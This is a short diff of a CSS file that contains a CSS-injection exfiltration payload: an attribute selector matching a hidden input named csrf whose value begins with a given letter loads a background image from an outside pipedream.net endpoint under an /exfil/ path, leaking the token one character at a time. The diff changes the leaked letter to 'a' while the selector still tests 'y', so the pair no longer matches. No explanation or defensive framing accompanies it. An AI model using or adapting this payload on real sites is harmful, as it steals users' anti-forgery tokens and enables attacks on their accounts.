@@ -3,5 +3,5 @@ body {
 }
 
 input[name=csrf][value^=y]{
-    background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/y);
+    background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/a);
 }
